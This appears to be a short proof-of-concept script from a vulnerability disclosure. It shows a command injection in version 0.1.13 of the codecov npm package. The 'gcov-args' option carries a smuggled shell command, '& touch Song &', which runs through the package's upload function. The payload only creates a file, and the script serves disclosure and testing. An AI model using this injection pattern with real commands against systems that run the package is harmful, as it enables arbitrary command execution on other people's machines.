/**
 * version "0.1.13" of codecov is vulnerable to command injection.
 * 
 * The injection point is located in line 359 of file "lib/codecov.js".
 * The first arguments args can be controlled by users without any sanitization. 
 */
var root = require("codecov");
var args = {
  "options": {
    'gcov-args': "& touch Song &"
  }
}
root.handleInput.upload(args, function(){}, function(){});
